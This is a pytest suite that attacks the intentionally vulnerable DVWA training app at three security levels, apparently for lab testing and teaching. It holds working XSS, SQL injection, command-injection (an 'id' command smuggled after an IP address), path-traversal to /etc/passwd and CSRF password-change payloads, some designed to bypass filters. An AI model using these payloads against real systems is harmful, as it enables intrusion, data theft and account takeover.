"""
Multi-Security-Level Vulnerability Tests

Tests vulnerabilities across DVWA security levels (Low, Medium, High).
Demonstrates how defenses evolve and bypass techniques.

OWASP Top 10: A03:2021 - Injection
"""

import pytest
import requests


pytestmark = pytest.mark.multi_level


class TestXSSMultiLevel:
    """XSS tests across security levels."""

    @pytest.mark.xss
    def test_reflected_xss_basic(self, dvwa_session, config, security_level):
        """
        Test basic reflected XSS across security levels.

        Low: No filtering - payload executes
        Medium: Basic filtering - some bypasses work
        High: Strong filtering - most bypasses blocked
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/xss_r/"

        # Payloads for different levels
        payloads = {
            "low": "<script>alert('XSS')</script>",
            "medium": "<ScRiPt>alert('XSS')</ScRiPt>",  # Case bypass
            "high": "<img src=x onerror=alert('XSS')>",  # Event handler
        }

        payload = payloads.get(security_level, payloads["low"])
        response = dvwa_session.get(url, params={"name": payload})

        # Check results based on level
        if security_level == "low":
            # Low: payload should be reflected
            assert "<script>" in response.text.lower() or "alert" in response.text
        elif security_level == "medium":
            # Medium: basic <script> blocked, case bypass may work
            has_script = "<script>" in response.text.lower()
            print(f"[{security_level}] Script tag reflected: {has_script}")
        else:
            # High: most payloads should be blocked
            has_payload = payload in response.text
            print(f"[{security_level}] Payload reflected: {has_payload}")

    @pytest.mark.xss
    def test_xss_filter_evolution(self, dvwa_session, config, set_security_level):
        """
        Test how XSS filters evolve across security levels.

        Documents the progression of defenses.
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/xss_r/"
        test_payload = "<script>alert(1)</script>"

        results = {}
        for level in ["low", "medium", "high"]:
            set_security_level(level)
            response = dvwa_session.get(url, params={"name": test_payload})
            results[level] = test_payload in response.text

        print("\n=== XSS Filter Evolution ===")
        print(f"Low (no filter): Vulnerable = {results['low']}")
        print(f"Medium (basic filter): Vulnerable = {results['medium']}")
        print(f"High (strong filter): Vulnerable = {results['high']}")

        # Low should be vulnerable
        assert results["low"], "Low level should be vulnerable to basic XSS"


class TestSQLiMultiLevel:
    """SQL Injection tests across security levels."""

    @pytest.mark.sqli
    def test_sqli_basic(self, dvwa_session, config, security_level):
        """
        Test basic SQL injection across security levels.

        Low: No escaping - injection works
        Medium: mysql_real_escape_string - quote escaping
        High: Parameterized query or strong validation
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/sqli/"

        # Payloads for different levels
        payloads = {
            "low": "1' OR '1'='1",
            "medium": "1 OR 1=1",  # Numeric injection (no quotes)
            "high": "1",  # Just test normal input
        }

        payload = payloads.get(security_level, payloads["low"])
        response = dvwa_session.get(url, params={"id": payload, "Submit": "Submit"})

        # Check for successful injection indicators
        if security_level == "low":
            # Should return multiple users
            user_count = response.text.lower().count("surname")
            print(f"[{security_level}] Users returned: {user_count}")
            assert user_count > 1, "Low level should be vulnerable"
        else:
            print(f"[{security_level}] Response length: {len(response.text)}")

    @pytest.mark.sqli
    def test_sqli_error_exposure(self, dvwa_session, config, security_level):
        """
        Test SQL error exposure across security levels.
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/sqli/"
        error_payload = "'"

        response = dvwa_session.get(url, params={"id": error_payload, "Submit": "Submit"})

        error_indicators = ["sql syntax", "mysql", "error"]
        has_error = any(ind in response.text.lower() for ind in error_indicators)

        print(f"[{security_level}] SQL error exposed: {has_error}")

        if security_level == "low":
            # Low level often exposes errors
            pass  # Informational
        elif security_level == "high":
            # High level should not expose errors
            assert not has_error, "High level should not expose SQL errors"


class TestCSRFMultiLevel:
    """CSRF tests across security levels."""

    @pytest.mark.csrf
    def test_csrf_token_enforcement(self, dvwa_session, config, security_level):
        """
        Test CSRF token enforcement across security levels.

        Low: No CSRF token
        Medium: Weak token validation
        High: Strong token validation
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/csrf/"

        # Get the page to see if token exists
        response = dvwa_session.get(url)
        has_token = "user_token" in response.text

        # Try changing password without valid token
        malicious_data = {
            "password_new": "hacked123",
            "password_conf": "hacked123",
            "Change": "Change",
            "user_token": "invalid_token",
        }

        post_response = dvwa_session.post(url, data=malicious_data)
        password_changed = "Password Changed" in post_response.text

        print(f"[{security_level}] Has token: {has_token}, Attack success: {password_changed}")

        if security_level == "low":
            # Low level has no/weak token
            assert password_changed, "Low level should be vulnerable to CSRF"
        elif security_level == "high":
            # High level should block
            assert not password_changed, "High level should block CSRF attack"


class TestCommandInjectionMultiLevel:
    """Command Injection tests across security levels."""

    @pytest.mark.slow
    def test_command_injection(self, dvwa_session, config, security_level):
        """
        Test command injection across security levels.

        Low: No filtering
        Medium: Blacklist filtering
        High: Whitelist/strong validation
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/exec/"

        # Payloads for different levels
        payloads = {
            "low": "127.0.0.1; id",
            "medium": "127.0.0.1 | id",  # Pipe instead of semicolon
            "high": "127.0.0.1",  # Clean input
        }

        payload = payloads.get(security_level, payloads["low"])
        response = dvwa_session.post(url, data={"ip": payload, "Submit": "Submit"})

        # Check for command execution
        has_uid = "uid=" in response.text

        print(f"[{security_level}] Command executed: {has_uid}")

        if security_level == "low":
            assert has_uid, "Low level should allow command injection"


class TestFileInclusionMultiLevel:
    """File Inclusion tests across security levels."""

    def test_file_inclusion(self, dvwa_session, config, security_level):
        """
        Test Local File Inclusion across security levels.

        Low: No validation
        Medium: Basic path filtering
        High: Strong validation
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/fi/"

        # Payloads for different levels
        payloads = {
            "low": "../../../../../../etc/passwd",
            "medium": "....//....//....//etc/passwd",  # Double encoding
            "high": "file1.php",  # Valid file
        }

        payload = payloads.get(security_level, payloads["low"])
        response = dvwa_session.get(url, params={"page": payload})

        # Check for /etc/passwd content
        has_passwd = "root:" in response.text

        print(f"[{security_level}] File inclusion success: {has_passwd}")

        if security_level == "low":
            assert has_passwd, "Low level should allow LFI"


class TestSecurityLevelComparison:
    """Compare vulnerability across all levels."""

    def test_vulnerability_matrix(self, dvwa_session, config, set_security_level):
        """
        Generate vulnerability matrix across security levels.
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        results = {"low": {}, "medium": {}, "high": {}}

        for level in ["low", "medium", "high"]:
            set_security_level(level)

            # Test XSS
            xss_url = f"{config.DVWA_URL}/vulnerabilities/xss_r/"
            xss_resp = dvwa_session.get(xss_url, params={"name": "<script>alert(1)</script>"})
            results[level]["xss"] = "<script>" in xss_resp.text.lower()

            # Test SQLi
            sqli_url = f"{config.DVWA_URL}/vulnerabilities/sqli/"
            sqli_resp = dvwa_session.get(sqli_url, params={"id": "1' OR '1'='1", "Submit": "Submit"})
            results[level]["sqli"] = sqli_resp.text.lower().count("surname") > 1

            # Test CSRF
            csrf_url = f"{config.DVWA_URL}/vulnerabilities/csrf/"
            csrf_resp = dvwa_session.post(csrf_url, data={
                "password_new": "test123",
                "password_conf": "test123",
                "Change": "Change",
                "user_token": "invalid",
            })
            results[level]["csrf"] = "Password Changed" in csrf_resp.text

        # Print matrix
        print("\n" + "=" * 50)
        print("VULNERABILITY MATRIX")
        print("=" * 50)
        print(f"{'Level':<10} {'XSS':<10} {'SQLi':<10} {'CSRF':<10}")
        print("-" * 50)
        for level in ["low", "medium", "high"]:
            xss = "✓ Vuln" if results[level]["xss"] else "✗ Safe"
            sqli = "✓ Vuln" if results[level]["sqli"] else "✗ Safe"
            csrf = "✓ Vuln" if results[level]["csrf"] else "✗ Safe"
            print(f"{level:<10} {xss:<10} {sqli:<10} {csrf:<10}")
        print("=" * 50)

        # Low should be vulnerable to all
        assert all(results["low"].values()), "Low level should be vulnerable to all attacks"
